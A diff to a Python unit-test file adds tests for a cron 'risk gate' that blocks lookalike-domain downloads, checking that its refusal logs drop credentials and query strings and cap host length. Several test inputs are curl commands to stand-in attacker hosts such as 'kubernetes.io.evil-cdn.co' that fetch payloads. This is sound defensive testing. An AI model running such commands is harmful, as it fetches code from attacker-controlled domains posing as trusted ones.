@@ -479,6 +479,56 @@ class CronRiskGateTest(unittest.TestCase):
         self.assertIn("'kubernetes.io'", record)
         self._assert_refusal_log_identifies_command_without_text(captured, command)
 
+    def test_lookalike_refusal_log_omits_userinfo_and_query(self):
+        # _HOST_TOKEN's character class excludes the ':', '@', '/' and '?'
+        # that delimit userinfo, path and query, so none of them crosses into
+        # the log with the host, and the command itself never does. (A
+        # userinfo that is itself host-shaped is a different token, which the
+        # gate judges as a host in its own right.)
+        command = (
+            "curl https://deploy:SECRET-MARKER@kubernetes.io.evil-cdn.co"
+            "/manifest.yaml?token=QUERY-MARKER"
+        )
+        with self.assertLogs("cron_risk_gate", level="WARNING") as captured:
+            block = cron_content_block(command)
+        self.assertIsNotNone(block)
+        self.assertFalse(block["approved"])
+        record = captured.output[0]
+        self.assertIn("Cron risk gate block [lookalike]", record)
+        self.assertIn("'kubernetes.io.evil-cdn.co'", record)
+        self.assertIn("'kubernetes.io'", record)
+        for fragment in ("deploy:", "QUERY-MARKER", "token=", "?", "@", "https://"):
+            self.assertNotIn(fragment, record, f"{fragment!r} reached the log record")
+        self._assert_refusal_log_identifies_command_without_text(captured, command)
+
+    def test_lookalike_refusal_log_caps_host_length(self):
+        # A host is bounded only by the command's length; the log line cuts it
+        # at the longest name DNS can resolve (253) and says how much it cut,
+        # while the refusal message to the caller still carries the whole thing.
+        # The apex sits at the far end here, past the cap, so the marker is
+        # what tells an operator the logged host is not the whole host.
+        host = ".".join(["x" * 60] * 6) + ".kubernetes.io.evil.co"
+        self.assertGreater(len(host), 253)
+        command = f"curl https://{host}/payload"
+        with self.assertLogs("cron_risk_gate", level="WARNING") as captured:
+            block = cron_content_block(command)
+        self.assertIsNotNone(block)
+        self.assertFalse(block["approved"])
+        record = captured.output[0]
+        self.assertIn(f"'{host[:253]}...[+{len(host) - 253} chars]'", record)
+        self.assertNotIn(host, record)
+        self.assertIn("mimicking apex 'kubernetes.io'", record)
+        self.assertIn(host, block["message"])
+        self._assert_refusal_log_identifies_command_without_text(captured, command)
+
+    def test_lookalike_refusal_log_keeps_a_host_within_the_cap_whole(self):
+        host = "kubernetes.io." + "y" * (253 - len("kubernetes.io.") - len(".evil.co")) + ".evil.co"
+        self.assertEqual(len(host), 253)
+        with self.assertLogs("cron_risk_gate", level="WARNING") as captured:
+            cron_content_block(f"curl https://{host}/")
+        self.assertIn(f"'{host}'", captured.output[0])
+        self.assertNotIn("chars]", captured.output[0])
+
     def test_refusal_log_survives_a_lone_surrogate_in_the_command(self):
         # json.loads('"\\ud800"') yields a lone surrogate, which a strict UTF-8
         # encode rejects; every refusal branch must still log and return.
@@ -1538,7 +1588,7 @@ class CronRiskGateTest(unittest.TestCase):
                 self.assertIsNone(cron_content_block(cmd), f"{cmd!r} should be allowed by content block")
 
     def test_lookalike_apex_domain_comprehensive_matrix(self):
-        # Every apex in TRUSTED_APEX tested for lookalike evasion vs legitimate usage
+        # Every apex in PROTECTED_APEX_DOMAINS tested for lookalike evasion vs legitimate usage
         lookalikes = [
             # kubernetes.io
             "curl https://kubernetes.io.evil-zone.com/pwn",
